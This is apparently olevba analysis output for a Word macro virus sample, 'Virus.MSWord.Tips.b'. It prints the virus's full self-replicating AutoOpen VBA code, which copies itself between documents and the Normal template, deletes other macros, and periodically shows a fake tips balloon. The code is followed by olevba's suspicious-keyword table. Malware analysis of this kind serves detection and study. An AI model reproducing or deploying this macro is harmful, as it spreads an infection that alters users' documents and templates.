olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tips.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tips.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Tips.b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro created 01/18/99 by billgates from cuddapah"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.AutoOpen.AutoOpen"
'
' AutoOpen Macro
' Macro created 01/18/99 by CUDDAPAH BELLGATES FROM MACROSHOFT
'
Dim newstr, filenme, oldstr, normal_template As String
Dim o_docname, n_docname As String
Dim source_name, target_name, temp_var As String
Dim cond_name As String
Dim vrbl As Integer
Dim i, target_flag As Integer
Dim j As Long
Dim cntnr As Object

Dim retval

Set cntnr = MacroContainer
'MsgBox cntnr.Name & "  Is the container of this running code", vbCritical
cond_name = cntnr.Name


On Error GoTo err1

'newstr = Application.ActiveWindow.Caption
'filenme = newstr
'newstr = newstr & " " & " "
'Application.Caption = "Macroshoft Word"
'oldstr = newstr
'Application.ActiveWindow.Caption = newstr
'Application.StatusBar = "Remember Microsoft Word is a Product of ORACLE Corporation INC!!!."
o_docname = Application.ActiveDocument.Path & "\" & Application.ActiveDocument.Name
 

' ********* getting the source file name **********

If cond_name = Application.NormalTemplate.Name Then

target_flag = 0
source_name = Application.NormalTemplate.Path & "\" & Application.NormalTemplate.Name
target_name = Application.ActiveDocument.Path & "\" & Application.ActiveDocument.Name

Else

target_flag = 1
source_name = Application.ActiveDocument.Path & "\" & Application.ActiveDocument.Name
target_name = Application.NormalTemplate.Path & "\" & Application.NormalTemplate.Name

End If


'MsgBox source_name & " " & target_name
'on counter set to four then message and counter = 0

temp_var = System.PrivateProfileString("C:\micros.Ini", "MacroSettings", _
    "LastFile")
vrbl = Val(temp_var)

If vrbl = "8" Then
vrbl = 0
System.PrivateProfileString("C:\Micros.Ini", "MacroSettings", _
    "LastFile") = Str(vrbl)
 Set BLN = Assistant.NewBalloon
 
 
With BLN
    .Heading = "Tips of day"
    .Labels(1).Text = "Run Scandisk Every Day"
    .Labels(2).Text = "Run Defrag Once in a Week"
    .Labels(3).Text = "Dont use Drive Compression."
    .BalloonType = msoBalloon
    .Mode = msoModeModal
    .Icon = msoIconAlert
    .Button = msoButtonSetOK
    
     retval = .Show
End With
Application.ActiveWindow.Close
End If

vrbl = vrbl + 1
System.PrivateProfileString("C:\Micros.Ini", "MacroSettings", _
    "LastFile") = Str(vrbl)

'MsgBox System.PrivateProfileString("C:\VirSet.Ini", "MacroSettings", _
    "LastFile")

normal_template = Application.NormalTemplate.Name




On Error GoTo err0

deletemacros (target_flag)


Application.OrganizerCopy source_name, target_name, "AutoOpen", wdOrganizerObjectProjectItems
Application.OrganizerCopy source_name, target_name, "ToolsMacro", wdOrganizerObjectProjectItems

If target_name = normal_template Then
Application.NormalTemplate.Save
End If

Application.ActiveDocument.Save

'MsgBox o_docname
'MsgBox Application.ActiveDocument.Name
err0:
'MsgBox Err.Description

Exit Sub
err1:
End Sub


Public Function deletemacros(t_flag As Integer)
'If t_flag = 0 Then MsgBox "Target is Active Document"
'If t_flag = 1 Then MsgBox "target is normal template"

Dim mct, u As Integer
Dim ass As String


If t_flag = 0 Then
    mct = ActiveDocument.VBProject.VBComponents.Count
    For u = 2 To mct
    ass = ActiveDocument.VBProject.VBComponents.Item(u).Name
    Application.OrganizerDelete ActiveDocument.Name, ass, wdOrganizerObjectProjectItems
    Next

End If

If t_flag = 1 Then
    mct = NormalTemplate.VBProject.VBComponents.Count
    For u = 2 To mct
    ass = NormalTemplate.VBProject.VBComponents.Item(u).Name
    Application.OrganizerDelete NormalTemplate.Name, ass, wdOrganizerObjectProjectItems
    Next

End If




End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

